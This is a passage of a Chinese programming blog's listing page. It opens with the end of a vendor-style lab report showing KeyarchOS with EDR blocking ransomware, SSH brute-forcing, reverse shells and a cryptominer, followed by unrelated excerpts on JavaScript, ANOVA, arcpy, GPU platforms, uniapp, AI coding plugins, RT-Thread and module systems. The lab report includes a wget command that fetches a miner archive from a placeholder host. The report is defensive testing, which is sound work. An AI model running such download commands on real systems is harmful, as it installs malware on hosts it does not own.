当目标机器安装EDR设备时，KeyarchOS将检查文件特征，因existRansom.tar符合勒索病毒特征，将联动EDR设备实时查杀该文件。最终，勒索病毒并不能成功入侵目标机器。
1.2 未知勒索病毒防护
在面对未知的勒索病毒时，KeyarchOS依旧展示出了出色的防护能力。在本次实验中，当新型勒索病毒逃匿病毒特征时，KeyarchOS将禁止该恶意病毒脚本运行。
1.3 基于行为勒索病毒检测
如果很不幸，病毒成功入侵并拥有了运行权限，那么病毒通常下一步将加密宿主数据。
在本次实验中，install.sh是勒索病毒的最终目的，它的作用是加密宿主机的docx文件。然而，当该恶意脚本在安装了EDR的KeyarchOS系统上运行时，由于检测到该进程符合勒索病毒行为，将直接终止并删除。故此，它依旧不能突破KeyarchOS的勒索病毒防护。
1.4 基于暴力破解的横向渗透防御
当然，一些“精明”的勒锁病毒在成功入侵宿主后，并不会立马加密宿主数据导致提前暴露。这些病毒的下一步通常为横向渗透，而一般途径为暴力破解。本次实验中，在宿主机的/usr/local/unexistRansom目录下运行hydra.sh（暴力破解工具），同时攻击未安装EDR主机A和已安装EDR主机B。如图，可以看到未主机A的ssh账号密码被成功爆破，而安装了EDR的KeyarchOS主机B成功将爆破行为拦截。由此可见，病毒的横向渗透在KeyarchOS系统面前依旧行不通。
挖矿病毒防护
挖矿病毒是一种利用主机漏洞进入系统的恶意软件。一旦进入系统，挖矿病毒会占用大量的系统资源进行加密货币挖掘。为了应对这种威胁，KeyarchOS主机安装了EDR（终端威胁检测与响应）工具。通过在不同阶段提供全面的防护，安装了EDR的KeyarchOS主机可以帮助用户有效防范挖矿病毒和其他网络威胁，保护数字世界的稳定和安全。同时，EDR工具还可以提供详细的日志和报告功能，方便用户进行系统管理和安全审计。
2.1 反弹shell入侵防护
在挖矿病毒入侵阶段，通常需要反弹目标主机的shell终端。实验中，利用目标主机的网站上传文件漏洞，上传并执行反弹shell脚本。如图，攻击者开始监听端口，接收shell。
在安装了EDR的KeyarchOS系统执行反弹脚本后，如图，并没有成功接收到shell
然后未安装EDR的系统执行反弹脚本后，攻击者成功得到了shell，意味成功控制受害主机
2.2 已知挖矿病毒防护
如果攻击者通过反弹shell获取主机操作权限后，下一步将下载包含病毒样本。实验中，通过命令“wget -r -np -nd --no-check-certificate https://IP:/test/ exist.tar”下载挖矿病毒的exist.tar，查看防护效果。主机A (安装EDR)下载已知病毒文件后被实时查杀，当前目录无exist.tar文件；主机B(未安装EDR)当前目录下存在exist.tar。显然，安装了EDR的KeyarchOS系统成功拦截了挖矿病毒的入侵。
2.3 未知挖矿病毒防护
若挖矿病毒成功入侵，安装了EDR的KeyarchOS系统能否成功防护呢。实验中，病毒样本开始创建定时任务(cron.sh)，以此来执行挖矿工具(enc.sh.x)。
在安装了EDR的KeyarchOS系统上，如图，创建定时任务与运行挖矿工具均失败告终。可见，装了EDR的KeyarchOS系统依然成功阻止挖矿病毒的破坏。
网页篡改
攻击者利用主机自身漏洞篡改网站页面。安装了EDR的KeyarchOS主机可以保护核心业务文件不受篡改，通过文件上传漏洞进行网页篡改及防护操作步骤如下：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2b46a3a23a3e955ea6af28222f3f3f13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08f97d2e2c9862cb62e81577a946f93e/" rel="bookmark">
			原生横向滚动条 吸附 页面底部
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果图
/** 横向滚动条 吸附 页面底部 */ export class StickyHorizontalScrollBar { constructor(options = {}) { const { el, style = '' } = options this.createScrollbar(style) this.insertScrollbar(el) this.setScrollbarSize() this.onEvent() } /** 创建滚轴组件元素 */ createScrollbar = (style = '') =&gt; { if (this.scrollbar) return this.scrollbar const timer = Date.now() this.thumbId = `thumb${timer}` this.scrollbarId = `scrollbar${timer}` this.scrollbar = document.createElement('div') this.scrollbar.setAttribute('id', this.scrollbarId) this.scrollbar.innerHTML = ` &lt;style&gt; #${this.scrollbarId} { position: sticky; width: 100%; box-shadow: 0 15px 0 0 #fff; bottom: 8px; left: 0; height: 17px; overflow-x: auto; overflow-y: hidden; margin-top: -17px; z-index: 3; ${style} } &lt;/style&gt; &lt;div id="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08f97d2e2c9862cb62e81577a946f93e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b5bce8044827b8134e0f0c0b741d257/" rel="bookmark">
			方差分析（一）（单因素方差分析）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 单因素方差分析数学模型统计分析 参考文献 方差分析是根据试验数据来推断一个或多个因素在其状态变化时，是否对试验指标产生显著影响的一种数理统计方法。方差分析按影响试验指标的因素的个数可分为单因素方差分析、双因素方差分析以及多因素方差分析。
在数理统计中，把试验的结果（如产品的性能、产量等）称为试验指标，影响试验指标的条件称为因素或因子，因素所处的不同状态称为水平。通常用大写字母 A , B , . . . A,B,... A,B,... 等表示不同的因素，用带下标的 A 1 , A 2 , . . . A_1,A_2,... A1​,A2​,... 等表示因素 A A A 的不同水平。
单因素方差分析 如果在一项试验中，只让一个因素的水平变动，其余因素的水平保持不变，那么称这种试验为单因素试验。在单因素试验下进行的方差分析称为单因素方差分析。
数学模型 设因素 A A A 有 r r r 个不同的水平 A 1 , A 2 , . . . , A r A_1,A_2,...,A_r A1​,A2​,...,Ar​，在每个水平 A i A_i Ai​ 下，进行 n i n_i ni​ 次独立重复试验，得到下表的结果
水平样本样本均值 A 1 A_1 A1​ X 11 X 12 ⋯ X 1 n 1 X_{11} \quad X_{12} \quad \cdots \quad X_{1n_1} X11​X12​⋯X1n1​​ X ˉ 1 \bar{X}_1 Xˉ1​ A 2 A_2 A2​ X 21 X 22 ⋯ X 2 n 2 X_{21} \quad X_{22} \quad \cdots \quad X_{2n_2} X21​X22​⋯X2n2​​ X ˉ 2 \bar{X}_2 Xˉ2​ ⋮ \vdots ⋮ ⋯ ⋯ ⋯ \cdots \quad \cdots \quad \quad \quad \quad\cdots ⋯⋯⋯ ⋮ \vdots ⋮ A r A_r Ar​ X r 1 X r 2 ⋯ X r n r X_{r1} \quad X_{r2} \quad \cdots \quad X_{rn_r} Xr1​Xr2​⋯Xrnr​​ X ˉ r \bar{X}_r Xˉr​ 假定各个水平 A i A_i Ai​ 对应的总体 X i X_i Xi​ 服从正态分布 N ( μ i , σ 2 ) N(\mu_i,\sigma^2) N(μi​,σ2)，又假定来自不同水平 A i A_i Ai​ 的样本之间是相互独立的。简而言之，正态总体、同方差、独立样本是进行方差分析的三个基本假定。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8b5bce8044827b8134e0f0c0b741d257/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0d470a396cf77b9e7c584716e2143dee/" rel="bookmark">
			添加Arcgis Pro3.0.1的Arcpy到Anaconda的Spyder中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、确认ArcGIS Pro的python版本 C:\Program Files\ArcGIS\Pro\bin\Python\envs\arcgispro-py3
我的是Python3.9.11，64 bit
2、确认Anaconda的python版本 我的是Python3.8.3，64 bit
不需要更改环境为32 bit，只需要创建Anaconda的Python版本为Python3.9.11的虚拟环境。
3、在Anaconda中创建Python 3.9.11环境 （1）创建环境
conda create --name arcpyPro3.0 python=3.9.11
（2）删除环境
conda remove -n arcpyPro3.0 --all
（3）查询创建的环境
conda env list
可以参考下面博主，解决环境位置的问题。
解决新创建的anaconda环境在C:\Users\xxx\.conda\envs\，而不在anaconda安装目录下的envs中_anaconda创建的虚拟环境存储在哪_半岛铁子_的博客-CSDN博客
4、激活环境 conda activate arcpyPro3.0
5、安装ArcGIS Pro API for Python conda install -c esri arcgispro=3.0
6、在线安装 conda install -c esri arcpy=3.0
7、离线安装 访问：Package repository for esri :: Anaconda.org
找到对应的文件
Files里有之前的版本，匹配自己的版本，我的是win-64/arcpy3.0-py39_arcgispro_36056.tar.bz2
安装离线的安装包
conda install D://arcpy-3.0-py39_arcgispro_36056.tar.bz2
这个主要原因是离线包不能是其他文件一般是.conda或者.tar.bz2
错误提示：CondaValueError: cannot mix specifications with conda package filenames 8、安装spyder conda install spyder
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0d470a396cf77b9e7c584716e2143dee/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/05aa6642354a6768817e38075b01ecfe/" rel="bookmark">
			怎么获得高性价比的GPU算力
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		很多人学习深度学习都不是用自己的电脑，所以需要在网上找一些免费或者性价比高的算力机器，所以我们找了几个平台推荐给大家：
一、paddle框架的免费算力
百度自己推出了paddle框架，paddle将很多的框架都封装了，使用很方便，小编就是直接用paddle训练的。所以推荐两个免费的paddle的算力平台，不过这两个只能用paddle框架，没法用其他框架。
1、ai studio平台
ai studio其实是百度给paddle学习者练手的平台，每天有8小时的算力卡，虽然说是8小时，其实并不是真的可以用8小时，需要按照自己的需求扣，比如不用GPU就可以一直跑，如果是最低配的GPU就是0.5小时卡/小时，也就是一天可以免费跑16小时。当然也有更高的，各位可以根据自己的需要选择。
新注册完成任务有100算力卡可以直接用，可以满足大部分的训练要求了。同时也有一些比赛可以参加，获奖也有免费的算力卡奖励。
链接：https://aistudio.baidu.com/aistudio/newbie?invitation=1&amp;sharedUserId=838141&amp;sharedUserName=%E9%9A%8F%E7%BC%98%E4%B8%B6%E9%80%8D%E9%81%A5
2、百度智能云
百度智能云其实是百度自己加的idc平台，所以在智能云上也有赠送50小时的训练时间，如果是预测的话其实可以把这50小时用完的。
链接：https://cloud.baidu.com/product/bml?navigation=0903
二、通用平台
之所以区分paddle和通用是因为上面两个只能用paddle框架，其他框架都没法用。下面的都是可以通用的。
1、阿里云天池
阿里云虽然没有自己的深度学习框架，但是一直在扶持深度学习，天池计划就是培养相关的人才的。同时阿里云天池也是每天有免费的算力可以用的。
链接：https://tianchi.aliyun.com/s/ac3eb3d2a98bebe59bcc37395cf87fdb
2、腾讯云
腾讯云和其他平台有两个区别：
（1）初体验
腾讯云有个30元体验15天，和240体验3个月的活动，8核32G+1颗T4的卡，这个价格算是很良心了。不过买过来是只安装了显卡驱动的，cuda和cudnn需要自己装。
（2）竞价实例
这个挺新颖的，就是按照原价的2折购买，但是如果GPU资源告急，就会释放掉我们的实例，如果GPU空闲就一直可以用，价格根据配置来，小时收费的。
链接：https://curl.qcloud.com/afuIBe9E
3、九天•毕昇
这个是移动开发的平台，也是和天池和ai studio差不多的平台，框架都支持，注册赠送100小时的训练时长。
链接：https://jiutian.10086.cn/edu/web#/register?token=YjUyZjZjYzUtYWMxZi00MDhlLWEzZTYtMTQwMzgyZjk0Yjhi
4、京东云
京东云有个MLOps平台，也是深度学习的训练平台，我用的paddle，但是它自带的版本太低了，所以就没有尝试,不过这个平台没看到怎么收费，运行了也没扣钱，感觉不要钱似的，各位可以试试。
链接:京东云
5、AutoDL平台
这个直接就是收费的平台，不过注册有10块钱的代金券，推荐这个主要是因为价格可以，对于小型的需要GPU预测的项目挺合适的。最低0.49元/小时，相对腾讯的竞价实例还要便宜不少。如果是花钱的平台训练也合适。
链接：https://www.autodl.com/register?code=b55e40a7-ab91-40ca-b720-3b23a44308ad
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c54f6153d62e69ffb345d6a1ddcee4f/" rel="bookmark">
			uniapp开发小程序经验记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		uniapp开发小程序的过程中会遇到很多问题，这里记录一下相关工具优化，便于后来者参考。
每次保存代码后，小程序都跳回首页 针对这个问题，常规的做法就是修改pages配置文件，但是这种方式不便于路由参数的设置，而且每次都是编码级的调整。
因此推荐使用开发工具中提供的”编译模式进行指定，流程如下：
小程序模拟器界面点进正在修改的目标页面在”普通编译“下拉框中选择”添加编译模式“
这一步会弹出对话框表单，并自动将当前页面已传入的参数填充进表单。如无特殊配置，那么录入”模式名称“然后点击确定即可保存。
后续再修改代码，只要这里的编译模式切换为指定模式，即可以此页面及当前所设置的传参为首页。 设计稿没按750 宽的屏幕为基准 查看设计稿宽度基准值，使用基准值除以750，将值写入下方箭头所指向的位置。比如我的设计稿宽度是390，那么390 ÷ 750 = 0.52，因此我在此处填入值为0.52，保留小数点后两位。
操作入口：工具》设置》语言服务配置
设置后效果
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27166aef9e8950b4b90736d97300bccd/" rel="bookmark">
			IntelliJ IDEA 智能（AI）编码工具插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 通义灵码-阿里CodeGeeX-清华大学+智谱AIBitoAmazon CodeWhisperer-亚马逊GitHub Copilot - 买不起CodeiumAIXcoder 仅仅自动生成单元测试功能
TestMe插件（免费）仅仅是模板填充，不智能。
Squaretest插件（收费）
目前感觉 通义灵码 和 bito 还行
通义灵码-阿里 免费
地址：https://tongyi.aliyun.com/lingma
通义灵码是阿里推出的基于通义大模型，提供代码智能生成、研发智能问答能力的人工智能编码助手，经过海量优秀开源代码数据训练，可根据当前代码文件及跨文件的上下文，为你生成行级/函数级代码、单元测试、代码注释等等。
功能
提供行级/函数级实时续写，你只需单击 Tab 键即可采纳。 按Alt+P也可以触发提示。Alt+[ 或 Alt + ]前后切换提示。 自然语言生成代码，在编辑器中，通过自然语言描述你想要的功能。生成单元测试，支持根据 JUnit、Mockito、Spring Test、unit test、pytest 等框架生成单元测试以及单元测试相关代码解释。 这块不咋地啊。 代码注释生成代码解释，选中代码后可自动识别编程语言并生成代码解释。跨越语言的边界，让你快速了解代码逻辑和功能设计。研发智能问答异常报错排查， 支持语言
支持 Java、Python、Go、C/C++、JavaScript、TypeScript、PHP、Ruby、Rust、Scala 等主流编程语言 使用
从插件市场安装，搜索通义灵码（TONGYI Lingma），找到通义灵码后点击安装。
重启 IntelliJ IDEA，重启成功后登录阿里云账号，即刻开启智能编码之旅。
CodeGeeX-清华大学+智谱AI 免费
地址：https://codegeex.cn/
CodeGeeX是一款基于大模型的全能的智能编程助手。它可以实现代码的生成与补全、自动添加注释、代码翻译以及智能问答等功能，能够帮助开发者显著提高工作效率。CodeGeeX支持主流的编程语言，并适配多种主流IDE。
功能
代码生成与补全注释生成代码翻译智能问答 支持语言
支持Python、Java、C++/C、JavaScript、Go等多种语言。 使用
从插件市场安装，搜索codegeex，找到codegeex后点击安装。
重启 IntelliJ IDEA，重启成功后登录账号支持很多种登录方式，微信和短信验证码很方便。
Bito 免费
地址：https://bito.ai/
Bito 是一款由 AI 驱动的代码助手，旨在帮助开发人员自动执行任务并将生成代码的速度提高 10 倍。
功能
代码生成解释代码创建测试用例生成注释检查性能检测安全漏洞 支持语言
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27166aef9e8950b4b90736d97300bccd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2bd61e88f6852d0940a635dc563d95b/" rel="bookmark">
			RT-Thread 三步实现利用DMA进行串口发送
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 应某些网友需求，说网上根本找不到基于Rt-Thread DMA串口发送代码，只有官方开源的串口DMA接收。
其实这些东西并不难，只要你细心去看哪些闲置的驱动文件且都是包装好的，通过关键字去查询或点开源文件查看，花不了几分钟，都很简单的。
一、更改驱动文件 在官方提供的驱动函数中，都赋予了static关键字限制或一些宏定义的限制，如果你需要用到这些限制函数，你只需要注释static关键字或打开宏定义即可。
二、打开宏定义 想要使用串口的DMA发送，需要在board.h打开相关宏定义
在串口驱动文件drv_usart.c中可以发现关于dma操作的函数只有两个，所以只需要删除两句函数开头的static关键字
三、串口配置传输 config.baud_rate = BAUD_RATE_115200; //修改波特率为 115200 config.data_bits = DATA_BITS_8; //数据位 8 config.stop_bits = STOP_BITS_1; //停止位 1 config.bufsz = 128; //修改缓冲区 buff size 为 128 config.parity = PARITY_NONE; //无奇偶校验位 rt_device_control(serial, RT_DEVICE_CTRL_CONFIG, &amp;config); /*控制串口设备。通过控制接口传入命令控制字，与控制参数 */ rt_device_open(serial, RT_DEVICE_FLAG_DMA_RX); /* 以 DMA 接收及轮询发送方式打开串口设备 */ rt_device_set_rx_indicate(serial, uart_input); /* 设置接收回调函数 */ stm32_dma_config(serial,RT_DEVICE_FLAG_DMA_TX); stm32_dma_transmit(serial, "123", 4,RT_SERIAL_DMA_TX); 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c6679c58dfb397318c407335e956a7e5/" rel="bookmark">
			Common.js 和 ES6 Module 中模块引入的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CommonJS和ES6 Module CommonJS是一种模块规范，最初被应用于Nodejs,成为Nodejs的模块规范。运行在浏览器端的javaScript由于也缺少类似的规范，在ES6出来之前，前端也实现了一套相同的模块规范（例如：AMD），用来对前端模块进行管理。
自ES6起，引入了一套新的ES6 Module规范，在语言标准层面实现了模块功能，而且实现得相当简单，有望成为浏览器和服务器通用的模块解决方案。但目前浏览器对ES6 Module兼容还不够友好，我们平时在Webpack中使用export和import，会经过Babel转换为CommonJS规范。
差异 1、语法差异 CommonJS: 使用require语句引入模块，使用module.exports导出模块。
// 引入模块 const moduleA = require('./moduleA'); // 导出模块 module.exports = someFunction; ES6: 使用import语句引入模块，使用export语句导出模块。
// 引入模块 import moduleA from './moduleA'; // 导出模块 export default someFunction; 2、动态导入 CommonJS: 是同步加载的，无法在运行时根据条件动态加载模块。
// CommonJS 中的同步加载 const moduleA = require('./moduleA'); ES6: 支持动态导入，可以在运行时根据条件异步加载模块。
// ES6 中的动态导入 import('./moduleA').then(moduleA =&gt; { // 处理 moduleA }); 3、静态分析 CommonJS: 运行时加载，无法在静态阶段进行优化。ES6: 可以在静态分析阶段进行优化，提高性能。 4、运行环境 CommonJS: 适用于服务器端开发和Node.js环境。ES6: 是ECMAScript标准的一部分，适用于现代浏览器和一些构建工具（如Webpack、Rollup等）。 5、模块的默认导出 // CommonJS 中导出默认模块 module.exports = someFunction; // ES6 中导出默认模块 export default someFunction; 6、CommonJs 是动态语法可以写在判断里，ES6 Module 静态语法只能写在顶层 在下面的例子中，require(‘.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c6679c58dfb397318c407335e956a7e5/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/60/">«</a>
	<span class="pagination__item pagination__item--current">61/489</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/62/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>